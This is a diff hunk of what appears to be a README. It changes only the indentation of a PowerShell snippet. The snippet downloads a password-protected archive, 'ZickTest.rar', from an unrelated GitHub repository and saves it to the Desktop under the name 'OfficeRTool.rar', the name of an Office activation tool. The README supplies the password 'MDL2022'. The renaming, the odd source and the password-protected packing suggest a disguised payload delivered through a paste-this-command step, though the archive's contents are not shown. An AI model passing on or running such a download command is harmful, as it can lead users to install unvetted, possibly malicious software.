@@ -14,22 +14,22 @@
 
 **- Password for Rar file is "MDL2022"**
 ````
-        <# v1.0 based on Xiang ZHU script #>
-        <# v1.1 Update by Aonodensetsu #>
-        
-        $url = 'https://github.com/DarkDinosaurEx/ZixSx/releases/latest'
-        $request = [System.Net.WebRequest]::Create($url)
-        $response = $request.GetResponse()
-        $realTagUrl = $response.ResponseUri.OriginalString
-        $version=$realTagUrl.split('/')[-1].Trim('v')
-        $O_fileName = "ZickTest.rar"
-        $N_fileName = "OfficeRTool.rar"
-        $realDownloadUrl = $realTagUrl.Replace('tag', 'download') + '/' + $O_fileName
-        $DesktopPath = [Environment]::GetFolderPath("Desktop")
-        $OutputFile = $DesktopPath+'\'+$N_fileName
-        Invoke-WebRequest -Uri $realDownloadUrl -OutFile $OutputFile
-        [Environment]::Exit(1)
-        [Environment]::Exit(1)
+<# v1.0 based on Xiang ZHU script #>
+<# v1.1 Update by Aonodensetsu #>
+
+$url = 'https://github.com/DarkDinosaurEx/ZixSx/releases/latest'
+$request = [System.Net.WebRequest]::Create($url)
+$response = $request.GetResponse()
+$realTagUrl = $response.ResponseUri.OriginalString
+$version=$realTagUrl.split('/')[-1].Trim('v')
+$O_fileName = "ZickTest.rar"
+$N_fileName = "OfficeRTool.rar"
+$realDownloadUrl = $realTagUrl.Replace('tag', 'download') + '/' + $O_fileName
+$DesktopPath = [Environment]::GetFolderPath("Desktop")
+$OutputFile = $DesktopPath+'\'+$N_fileName
+Invoke-WebRequest -Uri $realDownloadUrl -OutFile $OutputFile
+[Environment]::Exit(1)
+[Environment]::Exit(1)
 ````
 
 # Latest Changes
